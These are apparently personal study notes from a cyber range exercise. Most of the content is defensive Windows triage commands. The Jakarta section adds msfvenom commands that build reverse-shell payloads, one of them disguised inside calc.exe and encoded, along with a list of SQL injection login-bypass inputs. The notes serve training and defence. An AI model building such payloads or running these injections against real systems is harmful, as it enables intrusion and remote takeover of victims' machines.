<!--
Title: ASD Live Fire Exchange Programme (GitHub Markdown Version)
Author: Simon .I
Version: 2025.03.30
Description: GitHub-compatible Markdown (GHM) version using supported HTML like <details> and <table>.
-->

<!-- ASD Programme Title -->
<h1 align="center"><strong style="font-size: 4.5rem; letter-spacing: 4px; color: navy;">Australian Signals Directorate - Live Fire Exchange Program</strong></h1>

<p><strong>These are my personal notes from the <em>ASD Live Fire Cyberbitrange</em> event. This document is not provided by or affiliated with the <em>Australian Signals Directorate (ASD)</em> or <em>CyberbitRange</em>.</strong></p>

<details>
<summary><strong>🌐 LFE 1 Bangalore - Host-Based Threat Investigation</strong></summary>

### 🔎 Scenario: Command and Control (C2) Detection

- Gather logs using Event Viewer
- Identify malware via IOCs
- Remove malware and kill process
- Investigate network activity (C2)
- Block source and set firewall rules
- Remove persistence (startup/registry/scheduled tasks)

### 🧱 Step 1: Process Monitoring
```powershell
taskmgr

tasklist | findstr /i "powershell cmd python wscript cscript mshta wmic rundll32 regsvr32 schtasks bitsadmin"

taskkill /F /PID <PID>

eventvwr
```

### 🗓 Step 2: Scheduled Tasks
```powershell
taskschd

Get-ScheduledTask | ? {
  $_.TaskPath -notmatch "^\\Microsoft\\Windows" -and 
  ($_.Actions | % Execute | Out-String) -match "cmd|powershell|python|wscript|cscript|.bat|.vbs|.js|.py|mshta|rundll32|schtasks|bitsadmin"
}

Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
```

### 🧼 Step 3: Registry Startup
```powershell
regedit

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

### 🌐 Step 4: Network Communications
```powershell
netstat -bano
```

### 📁 Step 5: File Investigation
```powershell
Get-ChildItem -Path C:\Users -Include *.xlsx,*.docx,*.pdf -File -Recurse -ErrorAction SilentlyContinue
```

</details>

---

<details>
<summary><strong>🌋 LFE 2 Jakarta - Multi-Stage Malware & Analysis</strong></summary>

### 🔎 Scenario: Multi-Stage Malware with Data Exfiltration

- Analyse a malicious Office macro embedded in a phishing document
- Trace execution of an obfuscated VB script delivering a reverse shell payload
- Investigate payload generated using `msfvenom` to understand its capabilities
- Identify encrypted files and inspect use of OpenSSL for local encryption
- Monitor network activity and identify exfiltration using Wireshark
- Discover and exploit an SQL injection vulnerability for unauthorised data access

### 🔎 Macro Analysis with `oletools`

`oletools` is a Python-based toolset for analysing Microsoft OLE2 files (e.g. Office documents). It helps detect malicious macros, extract metadata, and uncover indicators of compromise.

#### 🔧 Common Tools & Flags:
```bash
olevba -a suspicious.doc
olevba -c suspicious.doc
olevba --decode suspicious.doc
olevba --json suspicious.doc

mraptor suspicious.doc
mraptor --json suspicious.doc

olemeta suspicious.doc
olemeta --json suspicious.doc

oleid suspicious.doc
oleid --json suspicious.doc

oleobj -e -d output suspicious.doc
rtfobj -d output suspicious.rtf
```

### 💣 Payload Crafting with `msfvenom`

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output> [-e <encoder>] [-i <iterations>] [-x <template.exe>]
```

#### 🧾 Flag Breakdown:
- `-p`: Payload type
- `LHOST`: Attacker IP
- `LPORT`: Listener port
- `-f`: Output format (e.g. exe, elf, psh)
- `-o`: Output file
- `-e`: Encoder
- `-i`: Iterations
- `-x`: Inject into another executable

#### 🧰 Examples:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 -f exe -o payload.exe

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 -f exe -x C:\Windows\System32\calc.exe -o mal.exe -e x86/shikata_ga_nai -i 3
```

### 🔐 File Encryption with OpenSSL
```bash
openssl.exe enc -aes-256-cbc -base64 -in "C:\Users\cyberuser\Desktop\Files\Pass.txt" -out "C:\Users\cyberuser\Desktop\Pass.enc" -K 000001234567890ABCDEFABCDEF -iv 0
```

### 📊 Wireshark Filters
```wireshark
frame.number == 1437
frame.number >= 1434 and frame.number <= 1440
tcp.analysis.retransmission
frame.number == 1437 and tcp.analysis.retransmission
```

### 🔢 SQL Injection Basics

**SQL injection** was found in a web-based login form hosted on the compromised environment.

#### Sample Inputs:
```text
Username: ' OR 1=1;--
Password: anything

Username: admin' --
Password: anything

Username: ' OR 'a'='a';--
Password: anything

Username: " OR ""="
Password: anything

Username: ' OR 1=1 LIMIT 1;--
Password: doesn't matter

Username: admin')--
Password: test

Username: ' UNION SELECT null, version();--
Password: anything
```

#### Underlying Query Logic:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password';
```

Injecting:
```sql
SELECT * FROM users WHERE username = '' OR 1=1;--' AND password = '';
```
</details>
